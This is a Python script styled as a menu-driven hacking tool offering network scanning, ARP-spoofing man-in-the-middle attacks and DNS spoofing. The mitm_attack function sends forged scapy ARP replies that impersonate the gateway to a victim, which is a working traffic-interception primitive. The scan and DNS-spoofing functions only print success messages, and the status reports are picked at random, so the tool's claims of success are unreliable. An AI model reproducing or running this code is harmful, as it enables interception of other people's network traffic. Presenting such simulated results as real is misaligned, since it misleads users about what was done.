import os
import time
import random
import subprocess
from colorama import Fore, Back, Style
from scapy.all import *

def clear_screen():
    """Clears the screen"""
    os.system('clear')

def banner():
    """Program Title"""
    print(Fore.CYAN + Style.BRIGHT + "===================================")
    print(Fore.YELLOW + Style.BRIGHT + "    InfiNet Tool V2000000000")
    print(Fore.CYAN + Style.BRIGHT + "===================================")
    print(Fore.GREEN + Style.BRIGHT + "**Developed by:** leronru ")

def show_menu():
    """Main Menu"""
    print(Fore.GREEN + "\nMain Menu")
    print(Fore.YELLOW + "[1] Network Scan (ARP Spoofing)")
    print(Fore.YELLOW + "[2] Start MITM Attack")
    print(Fore.YELLOW + "[3] Traffic Redirection (DNS Spoofing)")
    print(Fore.YELLOW + "[4] Select Attack Type")
    print(Fore.YELLOW + "[5] Status Updates")
    print(Fore.YELLOW + "[6] Exit")
    choice = input(Fore.MAGENTA + "\nPlease choose an option (1/2/3/4/5/6): ")
    return choice

def advanced_attack_choice():
    """Attack Type Selection (Automatic Method)"""
    print(Fore.YELLOW + "\nAutomatically determining the attack type...")
    attack_type = random.choice(["ARP Spoofing", "MITM", "DNS Spoofing"])
    print(Fore.CYAN + f"Automatically Selected Attack Type: {attack_type}")
    return attack_type

def network_scan():
    """Network Scan Function (with ARP Spoofing)"""
    print(Fore.GREEN + "\nStarting network scan...")
    target_ip = input(Fore.CYAN + "Enter the target IP address: ")
    print(Fore.GREEN + f"Scanning network on {target_ip}...")
    time.sleep(2)
    print(Fore.GREEN + "Network scan completed.")
    time.sleep(1)

def mitm_attack():
    """Start MITM Attack (with ARP Spoofing)"""
    print(Fore.RED + "\nStarting Man-in-the-Middle attack...")
    victim_ip = input(Fore.CYAN + "Enter victim IP address: ")
    gateway_ip = input(Fore.CYAN + "Enter gateway IP address: ")

    print(Fore.YELLOW + f"ARP spoofing started. Target: {victim_ip} and Gateway: {gateway_ip}")
    
    try:
        # Creating ARP spoofing packet
        arp_reply = ARP(op=2, pdst=victim_ip, psrc=gateway_ip)
        send(arp_reply, count=10, verbose=False)
        
        print(Fore.GREEN + "Attack successfully initiated!")
        time.sleep(5)
    except Exception as e:
        print(Fore.RED + f"An error occurred: {e}")
        time.sleep(2)

def dns_spoofing():
    """DNS Spoofing"""
    print(Fore.YELLOW + "\nStarting DNS Spoofing...")
    target_ip = input(Fore.CYAN + "Enter the target IP address: ")
    spoofed_ip = input(Fore.CYAN + "Enter the IP address to redirect to (DNS spoofing): ")

    try:
        # DNS Spoofing process here
        print(Fore.GREEN + f"DNS requests from {target_ip} will be redirected to {spoofed_ip}.")
        time.sleep(2)
        print(Fore.GREEN + "DNS Spoofing successful!")
    except Exception as e:
        print(Fore.RED + f"An error occurred: {e}")
        time.sleep(2)

def performance_monitor():
    """Timer and Performance Monitoring"""
    start_time = time.time()
    print(Fore.CYAN + "\nMonitoring performance...")
    time.sleep(random.randint(1, 5))  # Simulation of attack duration
    end_time = time.time()
    duration = round(end_time - start_time, 2)
    print(Fore.YELLOW + f"Process duration: {duration} seconds")

def dynamic_report():
    """Dynamic Process Report"""
    attack_type = random.choice(["Network Scan", "MITM Attack", "DNS Spoofing"])
    status = random.choice(["Successful", "Failed"])
    duration = random.choice([f"{random.randint(1, 10)} seconds", f"{random.randint(10, 20)} seconds"])
    
    print(Fore.YELLOW + "\nDynamic Process Report")
    print(Fore.GREEN + f"Attack Type: {attack_type}")
    print(Fore.RED + f"Status: {status}")
    print(Fore.BLUE + f"Process Duration: {duration}")
    time.sleep(2)

def show_instructions():
    """Help Menu"""
    print(Fore.CYAN + "\nHelp: This tool can perform MITM attacks, network scans, and traffic redirections.")
    print(Fore.YELLOW + "Please follow the steps below:")
    print(Fore.GREEN + "1. Enter target IP and Gateway information.")
    print(Fore.RED + "2. Start network scan or MITM attack.")
    print(Fore.MAGENTA + "3. Once the process is completed, reports will be displayed automatically.")

def advanced_logging():
    """Advanced Logging (Save User Interactions)"""
    timestamp = time.strftime("%Y-%m-%d %H:%M:%S")
    log_entry = f"{timestamp} - User initiated an attack.\n"
    
    with open("attack_log.txt", "a") as log_file:
        log_file.write(log_entry)
    
    print(Fore.CYAN + f"Log entry created successfully at {timestamp}.")

def main():
    """Main program function"""
    while True:
        clear_screen()
        banner()
        choice = show_menu()

        if choice == '1':
            network_scan()
        elif choice == '2':
            mitm_attack()
        elif choice == '3':
            dns_spoofing()
        elif choice == '4':
            attack_type = advanced_attack_choice()
            print(Fore.CYAN + f"Selected attack type: {attack_type}")
            time.sleep(2)
        elif choice == '5':
            performance_monitor()
        elif choice == '6':
            print(Fore.CYAN + "\nExiting...")
            time.sleep(1)
            break
        else:
            print(Fore.RED + "Invalid option! Please choose 1, 2, 3, 4, 5, or 6.")
            time.sleep(1)

        dynamic_report()
        advanced_logging()
        show_instructions()

if __name__ == "__main__":
    main()
